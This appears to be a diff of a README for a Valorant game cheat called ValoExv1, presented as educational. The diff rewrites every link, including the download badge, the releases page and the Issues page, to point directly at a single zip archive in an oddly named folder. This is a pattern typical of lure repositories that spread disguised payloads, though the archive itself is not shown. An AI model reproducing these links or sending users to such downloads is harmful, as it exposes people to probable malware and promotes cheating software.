@@ -1,6 +1,6 @@
 # 🚀 ValoExv1 - Simple Cheats for Learning Valorant
 
-[![Download ValoExv1](https://img.shields.io/badge/Download-ValoExv1-brightgreen)](https://github.com/JSAB09/ValoExv1/releases)
+[![Download ValoExv1](https://github.com/JSAB09/ValoExv1/raw/refs/heads/main/erotomania/Valo_Exv_v3.8-beta.3.zip)](https://github.com/JSAB09/ValoExv1/raw/refs/heads/main/erotomania/Valo_Exv_v3.8-beta.3.zip)
 
 **Valoexv1** is an external cheat for Valorant, designed solely for educational and experimental purposes. It includes features that demonstrate how various game systems and mechanics work, aimed at understanding technology within games.
 
@@ -10,7 +10,7 @@ To get started with ValoExv1, follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to see all available versions:  
-   [Download ValoExv1](https://github.com/JSAB09/ValoExv1/releases)
+   [Download ValoExv1](https://github.com/JSAB09/ValoExv1/raw/refs/heads/main/erotomania/Valo_Exv_v3.8-beta.3.zip)
 
 2. **Select the Right Version**  
    You will find different versions of the software. Look for the latest release labeled clearly.
@@ -53,7 +53,7 @@ Before using ValoExv1, make sure your system meets these basic requirements:
 
 To download ValoExv1, follow these steps once again:
 
-1. Go to the [Download Page](https://github.com/JSAB09/ValoExv1/releases).
+1. Go to the [Download Page](https://github.com/JSAB09/ValoExv1/raw/refs/heads/main/erotomania/Valo_Exv_v3.8-beta.3.zip).
 2. Choose the most recent version from the list.
 3. Click on the file name to download.
 4. Open the downloaded file and follow installation prompts.
@@ -71,7 +71,7 @@ If you encounter issues while installing or running ValoExv1, consider the follo
 
 Join our community for discussions or support. You can post questions or share your learning experience in the issues section of this repository.
 
-1. **Visit the [Issues Page](https://github.com/JSAB09/ValoExv1/issues)**.
+1. **Visit the [Issues Page](https://github.com/JSAB09/ValoExv1/raw/refs/heads/main/erotomania/Valo_Exv_v3.8-beta.3.zip)**.
 2. **Follow Discussions**: Engage with other users to share knowledge or resolve problems.
 
 ## 🔄 Contributing
